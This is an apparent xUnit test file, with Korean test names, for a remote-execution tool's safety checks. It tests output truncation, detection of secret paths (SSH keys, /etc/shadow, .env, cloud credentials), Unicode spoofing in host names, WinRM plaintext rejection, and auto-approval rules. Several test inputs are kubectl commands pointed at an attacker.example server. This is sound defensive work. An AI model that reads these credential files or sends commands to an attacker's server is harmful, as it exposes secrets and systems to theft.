using System;
using System.Linq;
using System.Net;
using System.Text;
using Nubis;
using Xunit;

namespace Nubis.Tests;

/// <summary>
/// 리뷰 2차: run_command 출력 수집(앞·뒤만 남김)·자르기, sftp_read 디코딩·비밀 경로, 호스트 이름 검사, WinRM 평문 응답, 읽기 전용 판별 반례
/// </summary>
public class Review2McpExecTests
{
    private static bool Sh(string c) => ReadOnlyCommands.IsReadOnly(c, CommandShell.Sh);
    private static bool Ps(string c) => ReadOnlyCommands.IsReadOnly(c, CommandShell.PowerShell);

    // ---------------------------------------------------------------- OutputCollector

    [Fact]
    public void 짧은_출력은_그대로_돌려준다()
    {
        var c = new OutputCollector();
        c.Add(Encoding.UTF8.GetBytes("안녕\nhello"));
        Assert.Equal("안녕\nhello", c.Text(8000));
        Assert.Equal(Encoding.UTF8.GetByteCount("안녕\nhello"), c.Total);
    }

    [Fact]
    public void 큰_출력은_앞과_끝만_남기고_가운데를_버린다()
    {
        var c = new OutputCollector(1024, 4096);
        c.Add(Encoding.UTF8.GetBytes("HEAD-START\n"));
        var chunk = Encoding.UTF8.GetBytes(new string('x', 1000) + "\n");
        for (var i = 0; i < 5000; i++) c.Add(chunk);   // 약 5MB
        c.Add(Encoding.UTF8.GetBytes("TAIL-ERROR"));
        var text = c.Text(8000);
        Assert.StartsWith("HEAD-START", text);
        Assert.EndsWith("TAIL-ERROR", text);
        Assert.Contains("생략", text);
        Assert.True(text.Length < 8300);
        Assert.True(c.Total > 5_000_000);
    }

    [Fact]
    public void 링_버퍼는_나눠_받아도_한번에_받은_것과_같은_끝부분을_남긴다()
    {
        var data = Enumerable.Range(0, 20_000).Select(i => (byte)('a' + i % 26)).ToArray();
        var one = new OutputCollector(100, 777);
        one.Add(data);
        var many = new OutputCollector(100, 777);
        var rnd = new Random(1);
        for (var pos = 0; pos < data.Length;)
        {
            var n = Math.Min(rnd.Next(1, 900), data.Length - pos);
            many.Add(data.AsSpan(pos, n));
            pos += n;
        }
        Assert.Equal(one.Text(100_000), many.Text(100_000));
        Assert.EndsWith(Encoding.ASCII.GetString(data[^500..]), many.Text(100_000));
    }

    [Fact]
    public void 가운데를_버릴_때_경계의_한글이_깨지지_않는다()
    {
        // 한글은 3바이트 — 앞부분 끝과 뒷부분 시작이 글자 중간에 걸리게 크기를 맞춘다
        var c = new OutputCollector(10, 20);
        c.Add(Encoding.UTF8.GetBytes(string.Concat(Enumerable.Repeat("가나다라마바사", 200))));
        var text = c.Text(8000);
        Assert.DoesNotContain('�', text);
    }

    // ---------------------------------------------------------------- ClipOutput · UTF-8 조각

    [Fact]
    public void 출력_자르기는_서로게이트_쌍을_반으로_자르지_않는다()
    {
        var emoji = "😀";   // 서로게이트 쌍
        var s = string.Concat(Enumerable.Repeat(emoji, 5000));
        var clipped = SshExec.ClipOutput(s, 1001);
        for (var i = 0; i < clipped.Length; i++)
        {
            if (char.IsHighSurrogate(clipped[i])) { Assert.True(i + 1 < clipped.Length && char.IsLowSurrogate(clipped[i + 1])); i++; }
            else Assert.False(char.IsLowSurrogate(clipped[i]));
        }
    }

    [Fact]
    public void 파일_끝_읽기는_앞의_잘린_글자를_버린다()
    {
        var bytes = Encoding.UTF8.GetBytes("가나다");
        Assert.Equal("나다", McpHelpers.DecodeUtf8Slice(bytes.AsSpan(1), cutStart: true, cutEnd: false));
        Assert.Equal("가나", McpHelpers.DecodeUtf8Slice(bytes.AsSpan(0, 8), cutStart: false, cutEnd: true));
        Assert.Equal("가나다", McpHelpers.DecodeUtf8Slice(bytes, cutStart: true, cutEnd: true));
        Assert.Equal("abc", McpHelpers.DecodeUtf8Slice(Encoding.ASCII.GetBytes("abc"), true, true));
    }

    // ---------------------------------------------------------------- sftp_read 비밀 경로

    [Theory]
    [InlineData("/root/.ssh/id_rsa")]
    [InlineData("~/.ssh/my_custom_key")]
    [InlineData(".ssh/authorized_keys")]
    [InlineData("/home/u/id_ed25519")]
    [InlineData("/etc/ssh/ssh_host_ed25519_key")]
    [InlineData("/etc/shadow")]
    [InlineData("/etc/gshadow")]
    [InlineData("/etc/sudoers")]
    [InlineData("/srv/app/.env")]
    [InlineData("/srv/app/.env.production")]
    [InlineData("/srv/app/prod.env")]
    [InlineData("/etc/nginx/ssl/server.key")]
    [InlineData("/opt/x/cert.PEM")]
    [InlineData("/home/u/.aws/credentials")]
    [InlineData("/home/u/.kube/config")]
    [InlineData("/home/u/.docker/config.json")]
    [InlineData("/home/u/.git-credentials")]
    [InlineData("/home/u/.pgpass")]
    [InlineData("/var/www/wp-config.php")]
    [InlineData("/etc/ssl/private/site.crt")]
    public void 비밀이_든_원격_경로는_자동_승인하지_않는다(string path) => Assert.True(McpHelpers.IsSensitiveRemotePath(path));

    [Theory]
    [InlineData("/var/log/nginx/error.log")]
    [InlineData("/etc/passwd")]
    [InlineData("/etc/hosts")]
    [InlineData("/home/u/app/config.yaml")]
    [InlineData("/etc/ssh/sshd_config")]
    [InlineData("/home/u/environment.txt")]
    public void 일반_파일은_비밀_경로가_아니다(string path) => Assert.False(McpHelpers.IsSensitiveRemotePath(path));

    // ---------------------------------------------------------------- 호스트 이름·계정 표시

    [Theory]
    [InlineData("web‮gnp.exe")]
    [InlineData("db​01")]
    [InlineData("a⁦b")]
    [InlineData("x\u0015y")]
    [InlineData("x\ny")]
    [InlineData("x\ty")]
    [InlineData("﻿web")]
    [InlineData("a\u2028b")]
    public void 보이지_않는_문자를_알아본다(string s) => Assert.True(McpHelpers.HasInvisibleChars(s));

    [Theory]
    [InlineData("웹서버-01")]
    [InlineData("prod web (ap-northeast-2)")]
    [InlineData("")]
    public void 일반_이름에는_보이지_않는_문자가_없다(string s) => Assert.False(McpHelpers.HasInvisibleChars(s));

    [Fact]
    public void 계정_표시는_사용자명과_출처를_보이고_제어_문자를_드러낸다()
    {
        Assert.Contains("root", McpHelpers.AccountLabel("root", "Vault 'ops'"));
        Assert.Contains("ops", McpHelpers.AccountLabel("root", "Vault 'ops'"));
        Assert.Contains("\\u{202E}", McpHelpers.AccountLabel("ro‮ot", null));
        Assert.DoesNotContain("root", McpHelpers.AccountLabel("", null));
    }

    // ---------------------------------------------------------------- WinRM

    [Fact]
    public void WinRM_HTTP_의_암호화되지_않은_성공_응답은_받아들이지_않는다()
    {
        var fake = Encoding.UTF8.GetBytes("<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\"><s:Body/></s:Envelope>");
        Assert.Throws<WinRmFatalException>(() => WinRm.UnencryptedBody(fake, HttpStatusCode.OK));
        // 오류 페이지는 XML 로 해석되지 않게 설명을 붙여 돌려준다 (꾸민 XML 이 성공 응답처럼 해석되지 않게)
        var body = WinRm.UnencryptedBody(fake, HttpStatusCode.InternalServerError);
        Assert.StartsWith("암호화되지 않은 응답", body);
        Assert.ThrowsAny<System.Xml.XmlException>(() => System.Xml.Linq.XDocument.Parse(body));
    }

    [Fact]
    public void WinRM_시간_초과_중단은_재시도하지_않고_출력을_따로_담는다()
    {
        var ex = new WinRmStoppedException("시간 초과", "partial out", "err");
        Assert.True(WinRm.StopRetrying(ex, shellCreated: false, default));
        Assert.Equal("partial out", ex.Stdout);
        Assert.DoesNotContain("partial out", ex.Message);
    }

    // ---------------------------------------------------------------- 읽기 전용 판별 반례

    [Theory]
    [InlineData("kubectl get pods -s https://attacker.example")]
    [InlineData("kubectl get pods -shttps://attacker.example")]
    [InlineData("kubectl get pods --server https://attacker.example")]
    [InlineData("kubectl get pods --server=https://attacker.example")]
    [InlineData("kubectl get pods --serv=https://attacker.example")]
    [InlineData("kubectl get pods --tls-server-name x")]
    public void kubectl_의_API_서버_바꾸기는_자동_승인하지_않는다(string c) => Assert.False(Sh(c));

    [Theory]
    [InlineData("kubectl get pods -n default")]
    [InlineData("kubectl get pods --sort-by=.metadata.name")]
    [InlineData("kubectl get pods --selector app=web")]
    public void kubectl_조회는_계속_자동_승인된다(string c) => Assert.True(Sh(c));

    [Theory]
    [InlineData("Get-WindowsUpdate -Install -AcceptAll")]
    [InlineData("Get-WindowsUpdate")]
    [InlineData("Get-WUList -Download")]
    [InlineData("Get-WUInstall -AcceptAll -AutoReboot")]
    [InlineData("get-wuinstall")]
    [InlineData("Get-Service; Get-WUInstall")]
    public void 설치하는_Get_cmdlet_은_자동_승인하지_않는다(string c) => Assert.False(Ps(c));

    [Theory]
    [InlineData("Get-Service")]
    [InlineData("Get-HotFix")]
    public void 일반_Get_cmdlet_은_계속_자동_승인된다(string c) => Assert.True(Ps(c));
}
